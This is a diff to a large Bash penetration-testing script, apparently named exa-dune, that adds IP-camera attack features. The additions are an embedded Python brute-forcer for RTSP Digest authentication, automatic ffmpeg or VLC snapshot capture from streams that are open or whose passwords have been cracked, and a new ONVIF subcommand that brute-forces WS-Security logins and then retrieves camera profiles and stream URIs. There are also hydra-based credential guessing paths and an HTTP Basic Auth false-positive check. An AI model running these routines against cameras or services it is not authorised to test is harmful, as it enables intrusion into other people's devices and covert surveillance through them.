@@ -40,7 +40,7 @@
 
 set -euo pipefail
 
-VERSION="2.0.0"
+VERSION="2.1.0"
 SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
 
 # ── Colori ──────────────────────────────────────────────────
@@ -1652,6 +1652,21 @@ cmd_creds() {
         fi
     }
 
+    # Ritorna 0 se il target usa realmente HTTP Basic Auth (risponde 401 a credenziali fasulle)
+    _http_requires_auth() {
+        local scheme="$1" p="$2"
+        local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
+        local bogus_code
+        bogus_code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
+                     --user "__bogus_exa__:__bogus_exa__" --max-time 5 \
+                     "${scheme}://${target}:${p}${path}" 2>/dev/null || echo "000")
+        if [[ "$bogus_code" == "200" || "$bogus_code" == "302" ]]; then
+            warn "  Falso positivo rilevato: ${scheme}://${target}:${p} risponde $bogus_code anche senza auth — test HTTP saltato"
+            return 1
+        fi
+        return 0
+    }
+
     _http_basic() {
         local scheme="$1" p="$2"
         local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
@@ -1659,6 +1674,8 @@ cmd_creds() {
             echo -e "${CYAN}[DRY-RUN]${NC} HTTP Basic auth test ${scheme}://${target}:${p}${path}"
             return
         fi
+        # Anti-falso-positivo: salta se il target non usa HTTP Basic Auth
+        _http_requires_auth "$scheme" "$p" || return 0
         local found_count=0
         while IFS= read -r user; do
             [[ -z "$user" ]] && continue
@@ -1670,7 +1687,7 @@ cmd_creds() {
                        "${scheme}://${target}:${p}${path}" 2>/dev/null)
                 if [[ "$code" == "200" || "$code" == "302" ]]; then
                     found HIGH "HTTP Basic ${scheme}:${p} — ${user}:${pass} → HTTP $code"
-                    ((found_count++))
+                    ((found_count++)) || true
                 fi
             done < "$pl"
         done < "$ul"
@@ -1685,9 +1702,9 @@ cmd_creds() {
         telnet) _hydra telnet "${port:-23}" ;;
         smb)    _hydra smb   "${port:-445}" ;;
         rdp)    _hydra rdp   "${port:-3389}" ;;
-        http)   _hydra http-get "${port:-80}"
+        http)   _http_requires_auth http "${port:-80}" && _hydra http-get "${port:-80}" || true
                 _http_basic http "${port:-80}" ;;
-        https)  _hydra https-get "${port:-443}"
+        https)  _http_requires_auth https "${port:-443}" && _hydra https-get "${port:-443}" || true
                 _http_basic https "${port:-443}" ;;
         vnc)    _hydra vnc   "${port:-5900}" ;;
         imap)   _hydra imap  "${port:-143}" ;;
@@ -1697,8 +1714,8 @@ cmd_creds() {
             _hydra ftp    "${port:-21}"
             _hydra telnet "${port:-23}"
             _hydra smb    "${port:-445}"
-            _hydra http-get "${port:-80}"
-            _hydra https-get "${port:-443}"
+            { _http_requires_auth http "${port:-80}"  && _hydra http-get  "${port:-80}"; } || true
+            { _http_requires_auth https "${port:-443}" && _hydra https-get "${port:-443}"; } || true
             _hydra vnc    "${port:-5900}"
             _hydra imap   "${port:-143}"
             _hydra pop3   "${port:-110}"
@@ -2779,25 +2796,163 @@ cmd_rtsp() {
         "/cam0" "/cam1" "/channel1" "/h264" "/mpeg4" "/mjpeg"
         "/stream1" "/stream2" "/media" "/media/video1" "/onvif/media"
         "/axis-media/media.amp" "/mpeg4/media.amp" "/image/jpeg.cgi"
+        "/h264Preview_01_main" "/h264Preview_01_sub" "/h264Preview_02_main"
+        "/Streaming/Channels/1" "/Streaming/Channels/2" "/ch1/main"
     )
     local ul; ul=$(_wl_users); local pl; pl=$(_wl_pass)
+    local open_streams=()
+
+    # Cattura uno snapshot RTSP tramite ffmpeg o vlc
+    _rtsp_snapshot() {
+        local surl="$1"
+        local snap_out="$OUTDIR/snapshot_$(date +%H%M%S).jpg"
+        if command -v ffmpeg &>/dev/null; then
+            ffmpeg -rtsp_transport tcp -i "$surl" -frames:v 1 -q:v 2 \
+                   "$snap_out" -y &>/dev/null && \
+                found MEDIUM "RTSP — snapshot catturato: $snap_out" || \
+                log "  Snapshot ffmpeg fallito (possibile auth richiesta)"
+        elif command -v cvlc &>/dev/null; then
+            cvlc --intf dummy --video-filter scene --scene-path "$OUTDIR" \
+                 --scene-prefix snapshot --scene-format jpg --run-time 2 \
+                 "$surl" vlc://quit &>/dev/null && \
+                found MEDIUM "RTSP — snapshot VLC salvato in $OUTDIR/" || \
+                log "  Snapshot VLC fallito"
+        else
+            warn "  Snapshot saltato: installa ffmpeg con: apt install ffmpeg"
+        fi
+    }
+
+    # Brute force Digest Auth RTSP via Python3 (nativo, senza hydra)
+    _rtsp_digest_brute() {
+        local rtsp_url="$1" rtsp_port="$2"
+        log "  RTSP Digest Auth brute force: $rtsp_url"
+        local py_script
+        py_script=$(mktemp /tmp/rtsp_digest_XXXXXX.py)
+        cat > "$py_script" <<PYEOF
+import socket, hashlib, sys, os
+
+target  = os.environ['RTSP_TARGET']
+port    = int(os.environ['RTSP_PORT'])
+rtsp_url = os.environ['RTSP_URL']
+ul_file = os.environ['RTSP_USERS']
+pl_file = os.environ['RTSP_PASS']
+out_file = os.environ['RTSP_OUT']
+
+def rtsp_request(req_bytes, timeout=4):
+    try:
+        s = socket.socket()
+        s.settimeout(timeout)
+        s.connect((target, port))
+        s.send(req_bytes)
+        r = s.recv(4096).decode(errors='replace')
+        s.close()
+        return r
+    except Exception:
+        return ''
+
+# Ottieni challenge Digest
+r1 = rtsp_request(f'DESCRIBE {rtsp_url} RTSP/1.0\r\nCSeq: 1\r\n\r\n'.encode())
+realm = nonce = ''
+for line in r1.split('\r\n'):
+    if 'realm=' in line:
+        try: realm = line.split('realm="')[1].split('"')[0]
+        except: pass
+    if 'nonce=' in line:
+        try: nonce = line.split('nonce="')[1].split('"')[0]
+        except: pass
+
+if not realm or not nonce:
+    print(f'[!] Digest challenge non ricevuto: {r1[:200]}', file=sys.stderr)
+    sys.exit(1)
+
+print(f'[*] Realm: {realm} | Nonce: {nonce}', file=sys.stderr)
+
+users = open(ul_file).read().splitlines()
+passs = open(pl_file).read().splitlines()
+found = False
+for user in users:
+    if not user: continue
+    for pwd in passs:
+        if not pwd: continue
+        ha1 = hashlib.md5(f'{user}:{realm}:{pwd}'.encode()).hexdigest()
+        ha2  = hashlib.md5(f'DESCRIBE:{rtsp_url}'.encode()).hexdigest()
+        # Ottieni nonce fresco ogni 50 tentativi per evitare scadenza
+        resp = hashlib.md5(f'{ha1}:{nonce}:{ha2}'.encode()).hexdigest()
+        auth = (f'Digest username="{user}", realm="{realm}", '
+                f'nonce="{nonce}", uri="{rtsp_url}", response="{resp}"')
+        r2 = rtsp_request(
+            f'DESCRIBE {rtsp_url} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth}\r\n\r\n'.encode()
+        )
+        if '200 OK' in r2:
+            print(f'[FOUND] {user}:{pwd}')
+            with open(out_file, 'a') as f:
+                f.write(f'{user}:{pwd}\n')
+            found = True
+            break
+    if found:
+        break
+if not found:
+    print('[*] Nessuna credenziale trovata', file=sys.stderr)
+PYEOF
+        RTSP_TARGET="$target" RTSP_PORT="$rtsp_port" RTSP_URL="$rtsp_url" \
+        RTSP_USERS="$ul" RTSP_PASS="$pl" RTSP_OUT="$OUTDIR/rtsp_digest_creds.txt" \
+            python3 "$py_script" 2>>"$OUTDIR/rtsp_digest.log" | \
+            while IFS= read -r line; do
+                if [[ "$line" == \[FOUND\]* ]]; then
+                    local cred="${line#\[FOUND\] }"
+                    found CRITICAL "RTSP Digest — credenziale valida: $cred"
+                fi
+            done || true
+        rm -f "$py_script"
+    }
+
     for p in "$port" 8554; do
         check_port "$target" "$p" || continue
         for path in "${rtsp_paths[@]}"; do
             local url="rtsp://${target}:${p}${path}"
             if [[ $DRY_RUN -eq 0 ]]; then
                 local resp
-                resp=$(curl -s --max-time 5 -X OPTIONS "$url" \
-                       -H "CSeq: 1" -H "User-Agent: EXA-DUNE" 2>&1 | head -5 || true)
+                resp=$(python3 -c "
+import socket
+s = socket.socket()
+s.settimeout(5)
+s.connect(('${target}', ${p}))
+s.send(b'OPTIONS ${url} RTSP/1.0\r\nCSeq: 1\r\n\r\n')
+print(s.recv(2048).decode(errors='replace'))
+s.close()
+" 2>/dev/null | head -5 || true)
                 if echo "$resp" | grep -qiE "RTSP/1\.|200 OK|Public:"; then
-                    found HIGH "RTSP:$p — stream accessibile: $url"
+                    found HIGH "RTSP:$p — server risponde: $url"
                     echo "$url" >> "$OUTDIR/rtsp_streams.txt"
-                    # Test accesso anonimo
+                    open_streams+=("$url:$p")
+                    # Test accesso anonimo DESCRIBE
                     local describe
-                    describe=$(curl -s --max-time 5 -X DESCRIBE "$url" \
-                               -H "CSeq: 2" -H "Accept: application/sdp" 2>&1 | head -10 || true)
+                    describe=$(python3 -c "
+import socket
+s = socket.socket()
+s.settimeout(5)
+s.connect(('${target}', ${p}))
+s.send(b'DESCRIBE ${url} RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\n\r\n')
+print(s.recv(4096).decode(errors='replace'))
+s.close()
+" 2>/dev/null | head -15 || true)
                     echo "$describe" >> "$OUTDIR/rtsp_describe_${p}.txt"
                     echo "$resp" >> "$OUTDIR/rtsp_options_${p}.txt"
+                    if echo "$describe" | grep -q "200 OK"; then
+                        found CRITICAL "RTSP:$p — stream accessibile SENZA autenticazione: $url"
+                        _rtsp_snapshot "$url"
+                    elif echo "$describe" | grep -qi "401.*Digest\|Digest.*401\|WWW-Authenticate.*Digest"; then
+                        log "  Digest Auth richiesta su $url — avvio brute force"
+                        _rtsp_digest_brute "$url" "$p"
+                        # Se trovata credenziale, prova snapshot
+                        if [[ -f "$OUTDIR/rtsp_digest_creds.txt" ]]; then
+                            local first_cred; first_cred=$(head -1 "$OUTDIR/rtsp_digest_creds.txt")
+                            local cuser="${first_cred%%:*}" cpass="${first_cred#*:}"
+                            _rtsp_snapshot "rtsp://${cuser}:${cpass}@${target}:${p}${path}"
+                        fi
+                    elif echo "$describe" | grep -qi "401\|Unauthorized"; then
+                        log "  Auth richiesta (non-Digest) su $url"
+                    fi
                 fi
             else
                 echo -e "${CYAN}[DRY-RUN]${NC} RTSP OPTIONS $url"
@@ -2805,7 +2960,7 @@ cmd_rtsp() {
         done
     done
 
-    section "RTSP Auth Brute Force (hydra)"
+    section "RTSP Auth Brute Force (hydra fallback)"
     for p in "$port" 8554; do
         check_port "$target" "$p" || continue
         if require_tool hydra; then
@@ -6208,6 +6363,7 @@ cmd_help() {
         ssl)     banner; usage_ssl    ;;
         tftp)    banner; usage_tftp   ;;
         rtsp)    banner; usage_rtsp   ;;
+        onvif)   banner; usage_onvif  ;;
         js)      banner; usage_js     ;;
         dns)     banner; usage_dns    ;;
         ipmi)    banner; usage_ipmi   ;;
@@ -6242,7 +6398,8 @@ cmd_help() {
             printf "  %-10s %s\n" "upnp"    "UPnP/SSDP audit            (nmap, curl SOAP)"
             printf "  %-10s %s\n" "ssl"     "TLS/SSL full audit         (testssl.sh, sslscan, openssl, nmap)"
             printf "  %-10s %s\n" "tftp"    "TFTP file enumeration      (atftp, nmap tftp-enum NSE)"
-            printf "  %-10s %s\n" "rtsp"    "RTSP stream audit          (nmap rtsp NSE, curl, hydra)"
+            printf "  %-10s %s\n" "rtsp"    "RTSP stream audit + Digest brute  (nmap, python3, hydra)"
+            printf "  %-10s %s\n" "onvif"   "ONVIF/gSOAP IP camera audit (curl SOAP, WS-Security brute)"
             printf "  %-10s %s\n" "js"      "JavaScript analysis        (endpoint/secret extraction)"
             printf "  %-10s %s\n" "dns"     "DNS enumeration            (dig, dnsrecon, host, nmap)"
             printf "  %-10s %s\n" "ipmi"    "IPMI/BMC audit             (nmap, ipmitool)"
@@ -6276,6 +6433,185 @@ cmd_help() {
 }
 
 # ============================================================
+#  SUBCOMMAND: onvif
+# ============================================================
+usage_onvif() {
+    echo "Uso: exa-dune onvif <TARGET> [OPTIONS]"
+    echo ""
+    echo "  ONVIF/gSOAP audit per telecamere IP e dispositivi IoT"
+    echo "  Usa SOAP via curl — nessuna dipendenza extra richiesta"
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT        Porta ONVIF (default: 8000, prova anche 8080, 80)"
+    echo "  --userlist FILE    Lista utenti"
+    echo "  --passlist FILE    Lista password"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_onvif() {
+    local target="" port=8000
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)     port="$2";        shift 2 ;;
+            --userlist) CUSTOM_USERS="$2"; shift 2 ;;
+            --passlist) CUSTOM_PASS="$2"; shift 2 ;;
+            --output)   OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)  DRY_RUN=1;        shift ;;
+            --help|-h)  usage_onvif; exit 0 ;;
+            -*)         err "Opzione sconosciuta: $1"; usage_onvif; exit 1 ;;
+            *)          target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_onvif; exit 1; }
+    validate_target "$target"
+    setup_outdir "$target" "onvif"
+    log "Target: $target | Porta ONVIF: $port | Output: $OUTDIR"
+
+    local ul; ul=$(_wl_users)
+    local pl; pl=$(_wl_pass)
+
+    # Envelope SOAP generico per probe anonimo
+    local soap_getinfo='<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
+  <s:Body>
+    <tds:GetDeviceInformation xmlns:tds="http://www.onvif.org/ver10/device/wsdl"/>
+  </s:Body>
+</s:Envelope>'
+
+    local soap_getcaps='<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
+  <s:Body>
+    <tds:GetCapabilities xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
+      <tds:Category>All</tds:Category>
+    </tds:GetCapabilities>
+  </s:Body>
+</s:Envelope>'
+
+    local soap_getprofiles='<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
+  <s:Body>
+    <trt:GetProfiles xmlns:trt="http://www.onvif.org/ver10/media/wsdl"/>
+  </s:Body>
+</s:Envelope>'
+
+    # Genera un SOAP envelope con WS-UsernameToken (digest)
+    _onvif_auth_envelope() {
+        local user="$1" pass="$2" soap_body="$3"
+        python3 - <<PYEOF 2>/dev/null
+import hashlib, base64, datetime, os, random, string
+
+user = '$user'
+pwd  = '$pass'
+# Nonce casuale
+nonce_raw = ''.join(random.choices(string.ascii_letters + string.digits, k=16)).encode()
+nonce_b64  = base64.b64encode(nonce_raw).decode()
+created    = datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')
+# WS-Security password digest = Base64(SHA1(nonce + created + password))
+digest = base64.b64encode(
+    hashlib.sha1(nonce_raw + created.encode() + pwd.encode()).digest()
+).decode()
+
+print(f'''<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
+            xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
+  <s:Header>
+    <wsse:Security>
+      <wsse:UsernameToken>
+        <wsse:Username>{user}</wsse:Username>
+        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">{digest}</wsse:Password>
+        <wsse:Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">{nonce_b64}</wsse:Nonce>
+        <wsu:Created>{created}</wsu:Created>
+      </wsse:UsernameToken>
+    </wsse:Security>
+  </s:Header>
+  <s:Body>
+    $soap_body
+  </s:Body>
+</s:Envelope>''')
+PYEOF
+    }
+
+    _onvif_soap() {
+        local onvif_url="$1" soap_env="$2" out_label="$3"
+        local resp
+        resp=$(curl -sk --max-time 10 -X POST "$onvif_url" \
+               -H 'Content-Type: application/soap+xml; charset=utf-8' \
+               -H 'SOAPAction: ""' \
+               --data-binary "$soap_env" 2>/dev/null || true)
+        echo "$resp" > "$OUTDIR/${out_label}.xml"
+        echo "$resp"
+    }
+
+    for p in "$port" 8080 80; do
+        check_port "$target" "$p" || continue
+        local onvif_url="http://${target}:${p}/onvif/device_service"
+        log "Tentativo ONVIF: $onvif_url"
+
+        section "ONVIF GetDeviceInformation (anonimo)"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local info_resp
+            info_resp=$(_onvif_soap "$onvif_url" "$soap_getinfo" "onvif_deviceinfo_anon")
+            if echo "$info_resp" | grep -qi "Manufacturer\|Model\|FirmwareVersion\|SerialNumber"; then
+                found HIGH "ONVIF:$p — GetDeviceInformation senza auth!"
+                echo "$info_resp" | grep -oP '<[^>]+>[^<]{1,80}<\/[^>]+>' | grep -iE "Manufacturer|Model|Firmware|Serial|HardwareId" | \
+                    while IFS= read -r line; do log "  $line"; done || true
+            elif echo "$info_resp" | grep -qi "NotAuthorized\|Sender not Authorized\|Fault"; then
+                log "  Auth richiesta — avvio brute force WS-Security"
+
+                section "ONVIF WS-Security Brute Force"
+                local body_getinfo='<tds:GetDeviceInformation xmlns:tds="http://www.onvif.org/ver10/device/wsdl"/>'
+                local found_cred=""
+                while IFS= read -r onvif_user; do
+                    [[ -z "$onvif_user" ]] && continue
+                    while IFS= read -r onvif_pass; do
+                        [[ -z "$onvif_pass" ]] && continue
+                        local auth_env
+                        auth_env=$(_onvif_auth_envelope "$onvif_user" "$onvif_pass" "$body_getinfo")
+                        [[ -z "$auth_env" ]] && continue
+                        local auth_resp
+                        auth_resp=$(_onvif_soap "$onvif_url" "$auth_env" "onvif_auth_test" 2>/dev/null)
+                        if echo "$auth_resp" | grep -qi "Manufacturer\|Model\|GetDeviceInformationResponse"; then
+                            found CRITICAL "ONVIF:$p — credenziale valida: ${onvif_user}:${onvif_pass}"
+                            echo "${onvif_user}:${onvif_pass}" > "$OUTDIR/onvif_creds.txt"
+                            found_cred="${onvif_user}:${onvif_pass}"
+                            break 2
+                        fi
+                    done < "$pl"
+                done < "$ul"
+
+                if [[ -n "$found_cred" ]]; then
+                    local fc_user="${found_cred%%:*}" fc_pass="${found_cred#*:}"
+                    section "ONVIF GetCapabilities + GetProfiles"
+                    local body_caps='<tds:GetCapabilities xmlns:tds="http://www.onvif.org/ver10/device/wsdl"><tds:Category>All</tds:Category></tds:GetCapabilities>'
+                    local caps_env; caps_env=$(_onvif_auth_envelope "$fc_user" "$fc_pass" "$body_caps")
+                    _onvif_soap "$onvif_url" "$caps_env" "onvif_caps" > /dev/null
+                    local body_prof='<trt:GetProfiles xmlns:trt="http://www.onvif.org/ver10/media/wsdl"/>'
+                    local prof_env; prof_env=$(_onvif_auth_envelope "$fc_user" "$fc_pass" "$body_prof")
+                    local prof_resp; prof_resp=$(_onvif_soap "${onvif_url/device_service/media_service}" "$prof_env" "onvif_profiles")
+                    # Estrai StreamUri
+                    local body_stream='<trt:GetStreamUri xmlns:trt="http://www.onvif.org/ver10/media/wsdl"><trt:StreamSetup><tt:Stream xmlns:tt="http://www.onvif.org/ver10/schema">RTP-Unicast</tt:Stream><tt:Transport xmlns:tt="http://www.onvif.org/ver10/schema"><tt:Protocol>RTSP</tt:Protocol></tt:Transport></trt:StreamSetup><trt:ProfileToken>Profile_1</trt:ProfileToken></trt:GetStreamUri>'
+                    local stream_env; stream_env=$(_onvif_auth_envelope "$fc_user" "$fc_pass" "$body_stream")
+                    local stream_resp; stream_resp=$(_onvif_soap "${onvif_url/device_service/media_service}" "$stream_env" "onvif_stream")
+                    local rtsp_uri; rtsp_uri=$(echo "$stream_resp" | grep -oP 'rtsp://[^<"]+' | head -1 || true)
+                    [[ -n "$rtsp_uri" ]] && found HIGH "ONVIF:$p — RTSP stream URI: $rtsp_uri"
+                fi
+            else
+                log "  Risposta ONVIF non riconosciuta (porta $p potrebbe non essere ONVIF)"
+                echo "$info_resp" | head -5 >> "$OUTDIR/onvif_raw_${p}.txt"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} ONVIF SOAP GetDeviceInformation → $onvif_url"
+            echo -e "${CYAN}[DRY-RUN]${NC} ONVIF WS-Security brute force con $ul / $pl"
+        fi
+        break  # Usa solo il primo porto raggiungibile
+    done
+
+    ok "ONVIF audit completato → $OUTDIR"
+}
+
+# ============================================================
 #  MAIN DISPATCHER
 # ============================================================
 [[ $# -eq 0 ]] && { cmd_help; exit 0; }
@@ -6298,6 +6634,7 @@ case "$subcommand" in
     ssl)     cmd_ssl     "$@" ;;
     tftp)    cmd_tftp    "$@" ;;
     rtsp)    cmd_rtsp    "$@" ;;
+    onvif)   cmd_onvif   "$@" ;;
     js)      cmd_js      "$@" ;;
     dns)     cmd_dns     "$@" ;;
     ipmi)    cmd_ipmi    "$@" ;;
